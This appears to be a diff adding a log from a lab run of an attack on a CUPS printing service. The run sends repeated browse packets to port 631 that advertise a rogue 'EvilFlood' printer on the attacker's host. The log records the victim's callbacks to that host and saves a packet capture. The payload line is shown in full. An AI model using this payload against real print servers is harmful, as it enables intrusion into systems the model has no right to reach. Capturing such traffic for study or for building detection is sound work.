@@ -1,0 +1,27 @@
+2026-11-16 21:07:59,290 INFO sniffing 12s for callbacks (filter: dst host 172.26.0.3 and dst port 12345)
+2026-11-16 21:07:59,793 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilFlood "Lab" "Printer"'
+2026-11-16 21:08:00,080 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilFlood "Lab" "Printer"'
+2026-11-16 21:08:00,347 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilFlood "Lab" "Printer"'
+2026-11-16 21:08:00,617 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilFlood "Lab" "Printer"'
+2026-11-16 21:08:00,881 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilFlood "Lab" "Printer"'
+2026-11-16 21:08:01,151 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilFlood "Lab" "Printer"'
+2026-11-16 21:08:01,415 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilFlood "Lab" "Printer"'
+2026-11-16 21:08:01,680 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilFlood "Lab" "Printer"'
+2026-11-16 21:08:01,946 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilFlood "Lab" "Printer"'
+2026-11-16 21:08:02,214 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilFlood "Lab" "Printer"'
+2026-11-16 21:08:02,481 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilFlood "Lab" "Printer"'
+2026-11-16 21:08:02,753 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilFlood "Lab" "Printer"'
+2026-11-16 21:08:11,315 WARNING CALLBACK: victim 172.26.0.4:34464 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:08:11,315 WARNING CALLBACK: victim 172.26.0.4:34476 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:08:11,315 WARNING CALLBACK: victim 172.26.0.4:34490 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:08:11,316 WARNING CALLBACK: victim 172.26.0.4:34504 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:08:11,316 WARNING CALLBACK: victim 172.26.0.4:34518 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:08:11,316 WARNING CALLBACK: victim 172.26.0.4:34528 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:08:11,316 WARNING CALLBACK: victim 172.26.0.4:34532 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:08:11,316 WARNING CALLBACK: victim 172.26.0.4:34540 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:08:11,316 WARNING CALLBACK: victim 172.26.0.4:34552 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:08:11,317 WARNING CALLBACK: victim 172.26.0.4:34554 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:08:11,317 WARNING CALLBACK: victim 172.26.0.4:34562 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:08:11,317 WARNING CALLBACK: victim 172.26.0.4:34578 initiated TCP to advertised 172.26.0.3:12345
+2026-11-16 21:08:11,317 INFO captured 12 packet(s) after sending
+2026-11-16 21:08:11,327 INFO wrote 24 packet(s) to pcap_files/attack-flood.pcap
